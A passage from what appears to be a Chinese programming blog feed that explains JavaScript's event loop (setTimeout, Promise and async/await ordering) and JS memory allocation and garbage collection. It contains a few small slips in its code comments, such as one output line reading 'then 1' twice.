punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 6. 浏览器在 0ms 后，将该函数推入任务队列</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 7. 打印 2</span>    Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 8. 将 resolve(1) 推入任务队列  9. 将 function函数推入任务队列</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ok'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 10. 打印 ok</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 3.调用 setTimeout 函数，并定义其完成后执行的回调函数</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 11. 浏览器 0ms 后，将该函数推入任务队列</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 12. 打印 3</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 4. 调用 setTimeout 函数，并定义其完成后执行的回调函数</span><span class="token comment" spellcheck="true">// 5. 主线程执行栈清空，开始读取 任务队列 中的任务</span><span class="token comment" spellcheck="true">// output： 1  2 ok 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JS 主线程拥有一个 <strong>执行栈（同步任务）</strong> 和 一个 <strong>任务队列（microtasks queue）</strong>，主线程会依次执行代码，</p><ul><li>当遇到函数（同步）时，会先将函数入栈，函数运行结束后再将该函数出栈；</li><li>当遇到 task 任务（异步）时，这些 task 会返回一个值，让主线程不在此阻塞，使主线程继续执行下去，而真正的 task 任务将交给 <strong>浏览器内核</strong> 执行，浏览器内核执行结束后，会将该任务事先定义好的<strong>回调函数</strong>加入相应的<strong>任务队列（microtasks queue/ macrotasks queue）</strong>中。</li><li>当JS主线程<strong>清空执行栈</strong>之后，会按先入先出的顺序读取microtasks queue中的<strong>回调函数</strong>，并将该函数入栈，继续运行执行栈，直到清空执行栈，再去读取<strong>任务队列</strong>。</li><li>当microtasks queue中的任务执行完成后，会提取 macrotask queue 的一个任务加入 microtask queue， 接着继续执行microtask queue，依次执行下去直至所有任务执行结束。</li></ul><p>这就是 <strong>JS的异步执行机制</strong></p><h3 id="四、async-await、Promise、setTimeout"><a href="#四、async-await、Promise、setTimeout" class="headerlink" title="四、async await、Promise、setTimeout"></a>四、async await、Promise、setTimeout</h3><ol><li><p><strong>setTimeout</strong></p><pre class="line-numbers language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//1. 打印 script start</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'settimeout'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 4. 打印 settimeout</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 2. 调用 setTimeout 函数，并定义其完成后执行的回调函数</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//3. 打印 script start</span><span class="token comment" spellcheck="true">// 输出顺序：script start->script end->settimeout</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>Promise</strong></p><p>Promise本身是<strong>同步的立即执行函数</strong>， 当在 executor 中执行 resolve 或者 reject 的时候, 此时是异步操作， 会先执行 then/catch 等，当主栈完成后，才会去调用 resolve/reject 中存放的方法执行，打印 p 的时候，是打印的返回结果，一个 Promise 实例。</p><pre class="line-numbers language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span><span class="token keyword">let</span> promise1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise1'</span><span class="token punctuation">)</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise1 end'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise2'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'settimeout'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 输出顺序: script start->promise1->promise1 end->script end->promise2->settimeout</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当JS主线程执行到Promise对象时，</p><ul><li>promise1.then() 的回调就是一个 task<ul><li>promise1 是 <strong>resolved 或 rejected</strong> ：那这个 task 就会放入<strong>当前事件循环</strong>回合的 microtask queue</li><li>promise1 是 <strong>pending</strong>：这个 task 就会放入 事件循环的<strong>未来的某个</strong>(可能下一个)回合的 microtask queue 中</li></ul></li><li>setTimeout 的回调也是个 task ，它会被放入 macrotask queue 即使是 0ms 的情况</li></ul><p><strong>回到文章开头经典的例子：</strong></p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> p <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 1. p 的状态为 resolve；</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">await</span> p<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2. 返回，并将 函数体后面的语句 console.log('await end') 放入下一个事件循环的 microtask queue 中</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'await end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 6. 执行，打印 await end</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 3. p 的状态为 resolve,会把 p.then() 放入当前事件循环的 microtask queue中。</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'then 1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 4. 执行，打印 then 1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'then 2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 5. 执行，打印 then 2，当前 microtask queue 结束，运行下一个 microtask queue</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 输出结果：then 1->then 1->await end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例如：</p><pre class="line-numbers language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 输出结果：script start->script end->promise1->promise2->setTimeout</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>async await</strong></p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 end'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async2'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 输出顺序：script start->async1 start->async2->script end->async1 end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>async 函数返回一个 Promise 对象，当函数执行的时候，一旦遇到 await 就会先返回，等到触发的异步操作完成，再执行函数体内后面的语句。可以理解为，是让出了线程，跳出了 async 函数体。</p><p>举个例子：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://camo.githubusercontent.com/127fb6994c3e219bae33573cc46aab7f97b7367b/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303139303133313137343431333536322e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/127fb6994c3e219bae33573cc46aab7f97b7367b/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303139303133313137343431333536322e706e67" alt="在这里插入图片描述"></a><br>很显然，func1的运行结果其实就是一个 Promise 对象。因此我们也可以使用 then 来处理后续逻辑。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>await 的含义为等待，也就是 async 函数需要等待 await 后的函数执行完成并且有了返回结果（ Promise 对象）之后，才能继续执行下面的代码。await通过返回一个Promise对象来实现同步的效果。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端JS内存管理</title>
      <link href="2019/09/12/jsRAM/"/>
      <url>2019/09/12/jsRAM/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>像C语言这样的底层语言一般都有底层的内存管理接口，比如 <code>malloc()</code>和<code>free()</code>。相反，JavaScript是在创建变量（对象，字符串等）时自动进行了分配内存，并且在不使用它们时“自动”释放。 释放的过程称为垃圾回收。这个“自动”是混乱的根源，并让JavaScript（和其他高级语言）开发者错误的感觉他们可以不关心内存管理。</p><h2 id="内存的生命周期"><a href="#内存的生命周期" class="headerlink" title="内存的生命周期"></a>内存的生命周期</h2><h3 id="生命周期概念"><a href="#生命周期概念" class="headerlink" title="生命周期概念"></a>生命周期概念</h3><p>无论是是使用什么编程语言，内存生命周期几乎都是一样的：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/neicun.png" alt></p><p>生命周期的概述：</p><ul><li>内存分配（Allocate memory ）：当我们申明变量、函数、对象的时候，系统会自动为他们分配内存</li><li>内存使用（Use memory ）：即读写内存，也就是使用变量、函数等</li><li>内存释放（Release memory ）：使用完毕，由垃圾回收机制自动回收不再使用的内存</li></ul><h3 id="内存的概念"><a href="#内存的概念" class="headerlink" title="内存的概念"></a>内存的概念</h3><p>在硬件层面，计算机内存是由大量的<a href="https://en.wikipedia.org/wiki/Flip-flop_(electronics)" target="_blank" rel="noopener">触发器</a>组成的。每一个触发器都包含有一些晶体管，能够存储1比特。单个触发器可通过一个唯一标识符来寻址，这样我们就可以读和写了。因此从概念上讲，我们可以把计算机内存看作是一个巨大的比特数组，我们可以对它进行读和写。</p><p>但是作为人类，我们并不善于用比特来思考和运算，因此我们将其组成更大些的分组，这样我们就可以用来表示数字。8个比特就是一个字节。比字节大的有字（16比特或32比特）。</p><p>有很多东西都存储在内存中：</p><ol><li>所有被程序使用的变量和其他数据</li><li>程序的代码，包括操作系统自身的代码</li></ol><p>当你编译你的代码时，编译器可以检查原始的数据类型并且提前计算出将会需要多少内存。然后把所需的（内存）容量分配给调用栈空间中的程序。这些变量因为函数被调用而分配到的空间被称为<strong>堆栈空间</strong>，它们的内存增加在现存的内存上面（累加）。如它们不再被需要就会按照 LIFO（后进，先出）的顺序被移除。例如，参见如下声明：</p><pre class="line-numbers language-js"><code class="language-js">int n<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 4 bytes</span>int x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// array of 4 elements, each 4 bytes</span>double m<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 8 bytes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>编译器可以立即清楚这段代码需要4 + 4 × 4 + 8 = 28字节。</p><blockquote><p>这就是它怎样工作于当前的 integers 和 doubles 型的大小。约20年前，integers通常（占用）2字节，double占4字节。你的代码不应该依赖于此时刻的基本数据类型的大小。</p></blockquote><p>编译器将插入些会互相作用于操作系统在堆栈上去请求必要的字节数来存储变量代码。</p><p>在以上例子中，编译器知道每个变量精确的内存地址。事实上，无论我们何时写入变量n，而本质上这会被翻译为如“内存地址 4127963 ”。</p><h3 id="JS内存分配"><a href="#JS内存分配" class="headerlink" title="JS内存分配"></a>JS内存分配</h3><p>为了不让程序员费心分配内存，JavaScript 在定义变量时就完成了内存分配。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//给数值分配内存空间</span><span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//给字符串分配内存</span><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">"hehe"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//给对象及其包含的值分配内存</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  a<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>  b<span class="token punctuation">:</span> <span class="token string">"str"</span><span class="token punctuation">,</span>  c<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 给数组及其包含的值分配内存（就像对象一样）</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"abra"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 给函数（可调用的对象）分配内存</span><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> a <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 函数表达式也能分配一个对象</span>someElement<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  someElement<span class="token punctuation">.</span>style<span class="token punctuation">.</span>backgroundColor <span class="token operator">=</span> <span class="token string">'blue'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有些函数调用结果是分配对象内存 如下：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 分配一个 Date 对象</span><span class="token keyword">var</span> e <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 分配一个 DOM 元素</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 有些方法是分配新变量或者新对象 如下：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">"azerty"</span><span class="token punctuation">;</span><span class="token keyword">var</span> s2 <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// s2 是一个新的字符串</span><span class="token comment" spellcheck="true">// 因为字符串是不变量，</span><span class="token comment" spellcheck="true">// JavaScript 可能决定不分配内存，</span><span class="token comment" spellcheck="true">// 只是存储了 [0-3] 的范围。</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"ouais ouais"</span><span class="token punctuation">,</span> <span class="token string">"nan nan"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> a2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"generation"</span><span class="token punctuation">,</span> <span class="token string">"nan nan"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> a3 <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 新数组有四个元素，是 a 连接 a2 的结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="JS使用内存"><a href="#JS使用内存" class="headerlink" title="JS使用内存"></a>JS使用内存</h3><p>基本上在 JavaScript 中使用分配的内存，就是对它进行读和写操作。</p><p>可以读写变量的值或某个对象的属性，甚至是给某个函数传递一个参数。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 分配内存</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 对内存的使用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="JS内存回收"><a href="#JS内存回收" class="headerlink" title="JS内存回收"></a>JS内存回收</h3><p><strong>当内存不再需要的时候要释放掉</strong></p><p>大部分的内存管理问题出现在这个阶段。</p><p>这里面最难的任务是指出，在什么时候分配的内存不再被需要。这通常需要开发者来决定程序中的那一块内存不再需要了，并释放。</p><p>高级语言嵌入了一个叫<strong>垃圾收集器</strong>的程序，它可以跟踪内存分配和使用情况，以找出在哪种情况下某一块已分配的内存不再被需要，并自动的释放它。</p><p>不幸的是，这种程序只是一种近似的操作，因为知道某块内存是否被需要是<a href="http://en.wikipedia.org/wiki/Decidability_(logic)" target="_blank" rel="noopener">不可判定的</a>（并不能通过算法来解决）。</p><p>大部分的垃圾收集器的工作方式是收集那些不能够被再次访问的内存，比如超出作用域的变量。但是，能够被收集的内存空间是低于近似值的，因为在任何时候都可能存在一个在作用域内的变量指向一块内存区域，但是它永远不能够被再次访问。</p><blockquote><p>不再需要使用的变量也就是生命周期结束的变量，是局部变量，局部变量只在函数的执行过程中存在， 当函数运行结束，没有其他引用(闭包)，那么该变量会被标记回收。</p></blockquote><blockquote><p>全局变量的生命周期直至浏览器卸载页面才会结束，也就是说全局变量不会被当成垃圾回收。</p></blockquote><p>因为自动垃圾回收机制的存在，开发人员可以不关心也不注意内存释放的有关问题，但对无用内存的释放这件事是客观存在的。 不幸的是，即使不考虑垃圾回收对性能的影响，目前最新的垃圾回收算法，也无法智能回收所有的极端情况。</p><h2 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h2><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>垃圾回收算法主要依赖于引用的概念。</p><p>在内存管理的环境中，一个对象如果有访问另一个对象的权限（隐式或者显式），叫做一个对象引用另一个对象。</p><p>例如，一个Javascript对象具有对它原型的引用（隐式引用）和对它属性的引用（显式引用）。</p><p>在这里，“对象”的概念不仅特指 JavaScript 对象，还包括函数作用域（或者全局词法作用域）。</p><h3 id="引用计数垃圾收集"><a href="#引用计数垃圾收集" class="headerlink" title="引用计数垃圾收集"></a>引用计数垃圾收集</h3><p>这是最初级的垃圾回收算法。</p><p>引用计数算法定义“内存不再使用”的标准很简单，就是看一个对象是否有指向它的引用。 如果没有其他对象指向它了，说明该对象已经不再需了。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token punctuation">{</span>   a<span class="token punctuation">:</span> <span class="token punctuation">{</span>    b<span class="token punctuation">:</span><span class="token number">2</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 两个对象被创建，一个作为另一个的属性被引用，另一个被分配给变量o</span><span class="token comment" spellcheck="true">// 很显然，没有一个可以被垃圾收集</span><span class="token keyword">var</span> o2 <span class="token operator">=</span> o<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// o2变量是第二个对“这个对象”的引用</span>o <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 现在，“这个对象”的原始引用o被o2替换了</span><span class="token keyword">var</span> oa <span class="token operator">=</span> o2<span class="token punctuation">.</span>a<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 引用“这个对象”的a属性</span><span class="token comment" spellcheck="true">// 现在，“这个对象”有两个引用了，一个是o2，一个是oa</span>o2 <span class="token operator">=</span> <span class="token string">"yo"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 最初的对象现在已经是零引用了</span>           <span class="token comment" spellcheck="true">// 他可以被垃圾回收了</span>           <span class="token comment" spellcheck="true">// 然而它的属性a的对象还在被oa引用，所以还不能回收</span>oa <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// a属性的那个对象现在也是零引用了</span>           <span class="token comment" spellcheck="true">// 它可以被垃圾回收了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由上面可以看出，引用计数算法是个简单有效的算法。但它却存在一个致命的问题：循环引用。</p><p>如果两个对象相互引用，尽管他们已不再使用，垃圾回收不会进行回收，导致内存泄露。</p><p>来看一个循环引用的例子：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> o2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  o<span class="token punctuation">.</span>a <span class="token operator">=</span> o2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// o 引用 o2</span>  o2<span class="token punctuation">.</span>a <span class="token operator">=</span> o<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// o2 引用 o  这里</span>  <span class="token keyword">return</span> <span class="token string">"azerty"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面我们申明了一个函数 f ，其中包含两个相互引用的对象。 在调用函数结束后，对象 o1 和 o2 实际上已离开函数范围，因此不再需要了。 但根据引用计数的原则，他们之间的相互引用依然存在，因此这部分内存不会被回收，内存泄露不可避免了。</p><p>再来看一个实际的例子：</p><pre><code>var div = document.createElement(&quot;div&quot;);div.onclick = function() {    